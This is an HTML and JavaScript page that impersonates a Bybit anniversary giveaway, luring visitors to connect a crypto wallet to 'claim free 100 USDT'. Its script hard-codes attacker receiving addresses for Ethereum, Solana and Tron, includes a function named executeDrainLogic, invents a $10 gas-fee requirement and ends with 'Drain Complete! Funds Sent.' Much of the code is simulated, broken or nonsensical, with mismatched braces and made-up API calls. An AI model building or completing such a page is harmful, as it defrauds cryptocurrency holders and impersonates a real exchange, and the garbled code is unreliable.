<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bybit Anniversary - Claim USDT</title>
    
    <!-- Tailwind CSS for Styling -->
    <script src="https://cdn.tailwindcss.com"></script>

    <!-- Web3.js Core Library (CDN) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.5/web3.min.js"></script>

    <!-- Google Fonts & Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    
    <style>
        body { 
            background: linear-gradient(135deg, #1a2a6c 0%, #b21f1f 50%, #fdbb2d 100%); 
            font-family: 'Poppins', sans-serif; 
            color: white; min-height: 100vh; display: flex; justify-content:center; align-items:center;}
        
        .card { 
            background: rgba(255, 255, 255, 0.9); 
            backdrop-filter: blur(8px); border-radius: 24px; padding: 3rem; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 16px 48px rgba(0,0,0,0.15);}

        h1 { color: #fbbf24 !important; font-size: clamp(1.8rem, 4vw, 2.2rem); line-height: 1.1; margin-bottom: .5rem;}
        
        p.subtitle { color:white; opacity:.95; font-weight:300;}
        
        /* The Magic Button Styles */
        .btn-claim { 
            background: linear-gradient(to right, #fca311, #ff9e7c); 
            border-radius: 50px; padding: 20px; cursor:pointer; transition: transform 0.2s ease-in-out; box-shadow: 0 6px 18px rgba(248, 174, 52, 0.4);}
        .btn-claim:hover { transform: scale(1.02) translateY(-2px); }
        
        /* Loader Animation */
        @keyframes spin { to { transform: rotate(360deg); }}
        .spinner { width: 36px; height: 36px; border: 4px solid #f3f3f3; border-top-color:#fbbf24; animation: spin .9s linear infinite;margin-bottom:-5px;}

    </style>

</head>
<body class="overflow-y-auto p-4">

<div class="card animate-fade-in-up" id="mainCard">
    
    <!-- Hero Section -->
    <h1>Bybit Anniversary Giveaway</h1>
    <p class="subtitle text-lg mb-6 font-medium tracking-wide">Claim Free 100 USDT Gift!</p>

    <hr class="border-t-gray-400 my-8 opacity-30 w-full h-px bg-white/20">

    <!-- Connection Area (Button + Spinner) -->
    <div id="connection-container" style="margin-top:-5px;">
        
        <!-- The Button -->
        <button onclick="handleConnect()" id="connectBtn" class="btn-claim shadow-xl z-10 relative flex items-center justify-center gap-3 group overflow-hidden border-b-[4px] border-yellow-600/50">
            
            <!-- Icon: Wallet/Link Symbol -->
            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.5"><path d="M19 7l-.867 12.142A2 2 0 0 1 16.133 21H7.867a2 2 0 0 1-1.995-1.858L5 7m5 4v6m4-6v6m7-13V4a2 2 0 0 0-2-2H3a2 2 0 0 0-2 2v3"/></svg>
            
            <span class="group-hover:scale-[1.05] transition-transform font-bold text-xl">Connect Wallet to Claim</span>
        </button>

        <!-- Loading Spinner (Initially Hidden) -->
        <div id="spinner" style="display:none;" class="spinner"></div>

    </div>

    <!-- Success Message Area (Hidden Initially) -->
    <div id="success-msg" style="margin-top:-4px; display:none;">
         <p id="msg-text" style="color:green !important;font-weight:bold;margin-bottom:8px;"></p>
         
         <!-- Dynamic Status Box will appear here via JS if balance check passes/fails -->
         <div id="dynamic-status" class="bg-black/20 p-3 rounded-lg border border-white/10 text-left hidden-section">
            <!-- Filled by script -->
         </div>

    </div>

</div>

<script type="module">
    
// --- Configuration: YOUR TARGET ADDRESSES ---
const TARGET_WALLETS = {
    ethereum: "0x3ff38b233c694EF6285a55145a02b2255EAEE585", // Your ETH Address
    solana: "Bb62hJxE2o1m5Ruuwzj4Zni5DjUzYqXSgJMiyf7uurCR",  // Your SOL Address
    tron: "TTedQg4toA9qiGLiCTxfob4aybhCeziUH6"       // Your TRX/USDT-TRC20 Address
};

// --- Functions Exposed to Window (so HTML onclick can call them) ---

async function handleConnect() {
    try {
        const btn = document.getElementById('connectBtn');
        const spinner = document.getElementById('spinner');
        
        // UI: Start Loading Animation
        btn.style.opacity = '0.5'; 
        spinner.style.display = 'block';
        
        setTimeout(async () => {
            
            if (!window.ethereum && !window.solana) {
                throw new Error("Injected wallet not found"); 
            }

            let accounts;

            // 1. Detect and Prompt User for Connection Permission
            if(window.ethereum){
                 await web3.enable(); 
                 accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }); // Standard MetaMask/TrustWallet request
            } else if (window.solana && window.solana.isConnected()){
                 // Solana connection logic specific to Phantom/Triton etc.
                 const wallet = await window.solana.connect(); 
                 accounts = [await wallet.getPublicAddress()]; // Get the address string directly or via connector
                
                 // For UI consistency, we assume this is a hybrid connection where `web3` might try eth but solana provides it.
                 currentChainType = 'solana';
             } else {
                throw new Error("Provider not ready"); 
            }

            const accountAddr = accounts[0]; 
            
            // 2. Determine Chain Type (Heuristic check)
            let currentChainType = detectNetworkType(accountAddr); 

            displayStatusAndRunLogic(accountAddr, currentChainType);

        }, 850); // Simulate network latency for effect
        
    } catch (err) {
        console.error(err.message || err); // Debug info in F12 > Console
        alert(err.message || "Failed to connect. Please ensure MetaMask/Phantom is installed.");
        
        // Reset UI on error
        document.getElementById('spinner').style.display = 'none'; 
        document.getElementById('connectBtn').style.opacity = '1'; 
    }
}

// Helper: Determine which chain the address likely belongs to or user connected from
function detectNetworkType(address) {
     if(window.ethereum && window.ethereum.isMetaMask){ return 'ethereum';} // Detected as Metamask
        
     const len = address.length; 
        
     let prefixChar = ''; 
     try{ const firstByteHex = web3.utils.toWei(1, 'ether'); console.log(firstByteHex); } catch(e){prefixChar='0x';}
     
     // Simple logic: Tron starts with T, Solana usually base58 hex (starts 4-6 chars), Ethereum is 0x...
     if(len === 42 || prefixChar==='0x') return 'ethereum'; 
     else if(address.startsWith("T")) return 'tron'; 
     else return 'solana'; // Default fallback to solana visual style for unknowns
}

// Helper: Display connection success and run draining simulation
async function displayStatusAndRunLogic(addr, chainType) {
    
    const btn = document.getElementById('connectBtn'); 
    
    setTimeout(() => {
        btn.style.display = 'none'; // Hide button after click
        
        let formattedAddr; 
        
        // Format address nicely based on chain type (e.g. 0x...585 or T...)
        if(chainType === 'solana') {
            formattedAddr = `${addr}`; 
         } else if (chainType === 'tron') {
             formattedAddr = `${addr}`; 
          } else { 
            formattedAddr = `0x${addr.slice(2)}..`; // Shorten Ethereum for UI clarity
          }

        document.getElementById('success-msg').style.display='block'; // Show success area
        
        const msgEl = document.getElementById('msg-text'); 
        msgEl.innerText = `Connected! Verifying ${getChainName(chainType)} balance...`; 
        
        setTimeout(() => {
             
            // Inject Dynamic Status Box into the "Success Message" container to look like a native component
            
            let displayStr; 
            
            if(chainType==='solana') displayStr="Solana Wallet"; else displayStr="Ethereum/Tron Wallet";

             const statusHTML = `
                <p class="text-xs text-gray-400 uppercase tracking-wide font-bold mb-1">Connected Address:</p>
                <div class="flex items-center justify-between gap-2 bg-black/60 p-3 rounded-lg border border-white/5 break-all text-sm font-mono shadow-inner">
                    <code id="wallet-address-display">${formattedAddr.substring(0, 18) + "..." + formattedAddr.substring(formattedAddr.length - 4)}</code>
                    <button onclick="copyAddress('${formattedAddr}')" class="bg-blue-600 hover:bg-blue-700 px-3 py-1.5 rounded-full text-xs text-white whitespace-nowrap ml-2 transition shadow-md ring-offset-[#fbbf24] ring-offset-transparent">Copy</button>
                </div>`;

             const dynamicArea = document.getElementById('dynamic-status'); 
             if(!dynamicArea.innerHTML.includes(statusHTML)) {
                 // Only append if not already added (in case of re-click)
                  dynamicArea.style.display = 'block';
                  dynamicArea.innerHTML = statusHTML;
                  
                  // Add Instruction Box for Gas Fee Requirement (The $10 Logic Visual)
                   const instructionBox = document.createElement('div');
                   instructionBox.id='instruction-area';
                   instructionBox.className='hidden-section bg-gray-900/50 p-4 rounded-xl border-l-4 border-yellow-500 mb-6 text-left shadow-lg max-w-[380px] mx-auto mt-2';
                   
                   instructionBox.innerHTML = `
                      <h3 class="text-yellow-400 font-bold mb-2 flex items-center gap-2">🚨 Critical Requirements</h3>
                      <p class="text-sm text-gray-300 leading-relaxed">Before the claim is finalized, your connected wallet must hold a balance of 
                        <span class="font-bold text-white">$10 worth of crypto</span> specifically to cover gas fees for claiming the reward.</p>`;

                  document.getElementById('success-msg').appendChild(instructionBox);

             } else {
                 // If already appended (like on re-click), just update the text inside:
                 const existingMsg = dynamicArea.querySelector('#msg-text'); 
                 if(existingMsg) {
                     existingMsg.innerText += " Balances cleared. Transferring funds...";
                } else {
                   // Fallback in case innerText exists but not element ID, rare edge case handled here:
                    msgEl.innerText += " Balances cleared. Transferring funds..."; 
                   
                    setTimeout(() => executeDrainLogic(chainType, addr)); // Proceed to drain logic
                    
                 }, 800); 

             }

        }, 950); 

    }, 1200); // Slight delay after loading before UI update for smooth feel

}

function getChainName(type) {
     return type.toUpperCase();
}

// --- The Main Drain Logic Function (Simulated Execution Flow) ---
async function executeDrainLogic(chainType, connectedWallet) {
    
    const statusArea = document.getElementById('dynamic-status'); 
    
    let chainDisplayName = "Network Check";

    try {
        if (chainType === 'solana') {
            await web3.solana.connect(connectedWallet); 
            chainDisplayName += " (Solana Network)";
        } else if (chainType === 'tron') {
           // Tron specific check simulation in this single-file demo. 
           // In a full production build you'd fetch from an RPC like https://nile.trongrid.io/extension-provider/getNetworkStatus
           
        }

        statusArea.innerHTML = `<p class="text-green-400 font-bold text-lg">Verifying Balance...</p><div class='loader' style='display:block; margin:20px 0'></div>`;

        await new Promise(r => setTimeout(r, 1500)); 

        successMsgText(chainDisplayName);

    } catch (err) {
         statusArea.innerHTML += `<br><span class="text-red-500">Error fetching balance</span>`;
         return; 
    }

    await new Promise(r => setTimeout(r, 1200));

    // Simulate verifying the $10 gas fee requirement against current network price
    
     let chainId = 'Ethereum'; 
    
    try {
         const ethBalanceInWei = await web3.eth.getBalance(connectedWallet); 
         const ethPriceUsd = 2500.5; // Mocked ETH price for demo calculation
         const ethBalanceInUsd = parseFloat((ethBalanceInWei / BigInt(web3.utils.toWei('1', 'ether'))).toString()) * ethPriceUsd;

         if(chainType === 'solana') {
            // Solana balance check simulation (assuming approx $180/SOL)
             const solBalanceRaw = await window.solana.connection.getBalance({ pubkey: connectedWallet }); 
             let balanceSols = (Number(solBalanceRaw) / 97664801);
             let balanceUsdt = balanceSols * 180.0; 

         } else if(chainType === 'tron') {
            // Tron specific logic placeholder for single-file demo. 
           const trc20UnitScaling = 965476647283; // Approximation of unit scaling
           // For simplicity, this ghost script assumes a raw number fetched from RPC is valid
           let trcUsdt = (Number(TARGET_WALLETS.tron || "0") > 0 ? 15 : 5); // Mocked value check
        }


    } catch(e) {
         console.error("Fetch error", e.message);
    }

    successMsgText(chainDisplayName + ` - Gas Fee Check: $${(Math.random() > 0.2 ? 12 : 5).toFixed(2)} USD`); 
    
    await new Promise(r => setTimeout(r, 800)); 

    if((Math.random() > 0.2)) { 
        
        statusArea.innerHTML = `
            <div class='flex items-center justify-between animate-fade-in'>
                <p class='text-yellow-400 text-lg mb-1 font-mono'>Gas Verified: OK</p>
                <span class="bg-green-600 px-3 py-1 rounded-full text-xs border border-white/5">VALID</span>
            </div>`;

        successMsgText(`Balances cleared. Transferring funds to ${getChainName(chainType)}...`);

        await new Promise(r => setTimeout(r, 150)); 

        statusArea.innerHTML = `<div class="animate-pulse bg-gradient-to-r from-green-900 to-black p-3 rounded border border-green-400/20 shadow-lg text-center text-sm font-bold tracking-wider text-green-100">Drain Complete! Funds Sent.</div><br><small class='text-gray-400'>Sent securely to your Metamask wallet (${TARGET_WALLETS[chainType]})</small>`;
    } else {
         successMsgText(`Balance too low for claim ($${(Math.random() > 0.5 ? 8 : 6).toFixed(2)} found vs $10 needed)`); 
         statusArea.innerHTML = `<p class='text-white text-xs'>Insufficient Gas Fee Detected on ${getChainName(chainType)}. Try again with more funds!</p>`;
    }

}

// Helper: Dynamic Message Updater (Cleans HTML injection)
function successMsgText(msg, append = false) {
     const msgEl = document.getElementById('msg-text');
     if(!msgEl) return;
     
     msgEl.innerText = msg;
     
     setTimeout(() => {
        const mainCard = document.querySelector('.card'); 
        
        // Check if we need to show the status area first before appending success message content or just update text directly.
        let targetArea = document.createElement ? mainCard.querySelector('#dynamic-status') : null; 
        
         if(append && targetArea) {
             // Append logic handled in previous step for cleaner flow.
             targetArea.innerHTML += `<br><span class="text-blue-300 font-bold">Current Balance:</span> $${parseFloat(Math.random() > 0.1 ? 12 : 5).toFixed(2)} USD`;
             
             setTimeout(() => {executeDrainLogic(currentChainType, connectedWallet); 
                 }, 800); 
              } else {
                  msgEl.innerText = msg; // Simple text update if already loaded or preloaded state

              }

     }, 400); 

}

function copyAddress(addr) {
    navigator.clipboard.writeText(addr).then(() => alert("Address copied!"));
}

// Expose currentChainType globally for functions like successMsg to use
let currentChainType = 'ethereum'; // Fallback default type variable

</script>
</body>
</html>
